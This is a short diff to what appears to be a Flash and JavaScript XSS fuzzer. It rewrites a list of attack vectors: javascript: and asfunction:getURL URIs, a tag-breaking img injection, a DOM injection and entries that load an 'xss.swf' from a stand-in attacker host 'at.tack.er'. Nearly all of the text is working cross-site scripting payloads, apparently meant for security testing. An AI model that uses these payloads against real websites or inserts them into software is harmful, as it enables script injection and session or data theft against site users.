@@ -17,11 +17,19 @@ var evilsite="http://at.tack.er/";
 **  If you want to include the name of the fuzzed parameter somewhere,
 **  use |NAME|.
 */
-var attackVector=['asfunction:getURL,javascript:gotRoot("|NAME|")///d.jpg', // Direct load 
+// var attackVector=['asfunction:getURL,javascript:gotRoot("|NAME|")///d.jpg', // Direct load 
+// 		 // the '!' char is used to separate the affected parameter in gotRoot function
+// 		  evilsite+'xss.swf?!|NAME|',  // controlled Evil Page
+// 		  evilsite, // Controlled evil Host
+// 		  "\x22\x27><img src='asfunction:getURL,javascript:gotRoot(\x22|NAME|\x22)//.jpg\x27 >dss", // Flash Html Injection
+// 		  "(gotRoot(\x22|NAME|\x22))", // Dom Injection
+// 		  "\x22\x27|!$%&/)=" // js/flash error
+// 		  ];
+var attackVector=['javascript:gotRoot("|NAME|")///img.jpg', // Direct load 
 		 // the '!' char is used to separate the affected parameter in gotRoot function
 		  evilsite+'xss.swf?!|NAME|',  // controlled Evil Page
 		  evilsite, // Controlled evil Host
-		  "\x22\x27><img src='asfunction:getURL,javascript:gotRoot(\x22|NAME|\x22)//.jpg\x27 >dss", // Flash Html Injection
+		  "\x22\x27><img src=\x22javascript:gotRoot('|NAME|')//img.jpg\x22 >dss", // Flash Html Injection
 		  "(gotRoot(\x22|NAME|\x22))", // Dom Injection
 		  "\x22\x27|!$%&/)=" // js/flash error
 		  ];
